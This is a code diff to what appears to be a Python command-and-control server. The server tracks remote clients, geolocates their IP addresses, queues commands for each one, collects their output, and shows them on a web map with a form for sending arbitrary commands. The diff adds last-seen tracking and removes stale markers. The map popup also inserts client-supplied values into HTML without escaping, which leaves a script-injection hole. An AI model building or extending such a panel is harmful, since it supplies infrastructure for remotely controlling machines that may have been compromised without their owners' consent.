@@ -6,6 +6,7 @@ from urllib.error import URLError
 import json
 import queue
 import random
+import time
 
 INDEX_PAGE = """
 <html>
@@ -20,21 +21,43 @@ INDEX_PAGE = """
     <script>
     let map;
     let markers = {};
+    const STALE = 60000; // fade after 1 min
+    const REMOVE = 300000; // remove after 5 min
+
+    function popupContent(c) {
+        const ts = new Date(c.last_seen * 1000).toLocaleString();
+        return `<b>${c.id}</b><br>IP: ${c.ip}<br>Last seen: ${ts}<br>
+            <form onsubmit=\"sendCmd(event,this,'${c.id}')\">
+            <input name=cmd placeholder=Command />
+            <button type=submit>Send</button>
+            </form><pre id=res_${c.id}>${c.result || ''}</pre>`;
+    }
+
     async function load() {
         const res = await fetch('/clients');
         const clients = await res.json();
+        const now = Date.now();
         clients.forEach(c => {
-            if (!markers[c.id]) {
-                const m = L.marker([c.lat, c.lon]).addTo(map);
-                m.bindPopup(`<b>${c.id}</b><br>IP: ${c.ip}<br>
-                    <form onsubmit=\"sendCmd(event,this,'${c.id}')\">
-                    <input name=cmd placeholder=Command />
-                    <button type=submit>Send</button>
-                    </form><pre id=res_${c.id}></pre>`);
+            const age = now - c.last_seen * 1000;
+            if (age > REMOVE) {
+                if (markers[c.id]) {
+                    map.removeLayer(markers[c.id]);
+                    delete markers[c.id];
+                }
+                return;
+            }
+            let m = markers[c.id];
+            const content = popupContent(c);
+            if (!m) {
+                m = L.marker([c.lat, c.lon]).addTo(map);
+                m.bindPopup(content);
                 markers[c.id] = m;
             } else {
-                markers[c.id].setLatLng([c.lat, c.lon]);
+                m.setLatLng([c.lat, c.lon]);
+                if (m.getPopup()) m.getPopup().setContent(content);
+                else m.bindPopup(content);
             }
+            m.setOpacity(age > STALE ? 0.5 : 1);
             const pre = document.getElementById('res_'+c.id);
             if (pre) pre.textContent = c.result || '';
         });
@@ -73,6 +96,7 @@ client_results = {}
 client_locations = {}
 client_ips = {}
 ip_counts = {}
+client_last_seen = {}
 
 def geolocate(ip):
     """Return (lat, lon) for the given IP using ip-api.com."""
@@ -111,6 +135,7 @@ class Handler(BaseHTTPRequestHandler):
                 client_results.setdefault(client_id, '')
                 client_ips[client_id] = ip
                 ip_counts[ip] = ip_counts.get(ip, 0) + 1
+                client_last_seen[client_id] = time.time()
                 if client_id not in client_locations:
                     lat, lon = geolocate(ip)
                     if ip_counts[ip] > 1:
@@ -155,6 +180,7 @@ class Handler(BaseHTTPRequestHandler):
                 res = payload.get('result')
                 if cid in clients:
                     client_results[cid] = res
+                    client_last_seen[cid] = time.time()
                     body = b'Result stored'
                     self.send_response(200)
                     self.send_header('Content-Length', str(len(body)))
@@ -181,7 +207,8 @@ class Handler(BaseHTTPRequestHandler):
                     'ip': client_ips.get(cid, ''),
                     'lat': client_locations.get(cid, (0, 0))[0],
                     'lon': client_locations.get(cid, (0, 0))[1],
-                    'result': client_results.get(cid, '')
+                    'result': client_results.get(cid, ''),
+                    'last_seen': client_last_seen.get(cid, 0)
                 }
                 for cid in sorted(clients)
             ]).encode()
@@ -194,6 +221,7 @@ class Handler(BaseHTTPRequestHandler):
             qs = parse_qs(parsed.query)
             cid = qs.get('client_id', [None])[0]
             if cid in clients:
+                client_last_seen[cid] = time.time()
                 try:
                     cmd = client_queues[cid].get(timeout=30)
                 except queue.Empty:
